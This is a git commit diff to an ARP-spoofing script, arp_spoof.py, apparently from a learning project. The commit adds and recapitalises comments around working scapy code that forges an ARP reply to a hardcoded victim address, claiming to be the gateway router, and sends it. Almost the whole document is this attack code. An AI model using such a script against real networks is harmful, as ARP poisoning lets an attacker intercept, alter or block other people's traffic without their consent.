1a881aa5629b4c2e7f3bb536339c389f1d8c33d4
Brian Peck <brian.peck@thecontrolgroup.com>
2019-01-31 17:08:33 -0800

    Commenting for target packet spoof

--- arp_spoof.py
+++ arp_spoof.py
@@ -4,8 +4,9 @@ import scapy.all as scapy
 
 # scapy.ls(scapy.ARP()) # shows scapy options for packet creation
 
-# target(victim) ip pdst
-# target(victim) mac hwdst
+# Target(victim) ip pdst
+# Target(victim) mac hwdst
 # Gateway(router) ip psrc
 packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
+# Tell the target computer that we are the Gateway router
 scapy.send(packet)
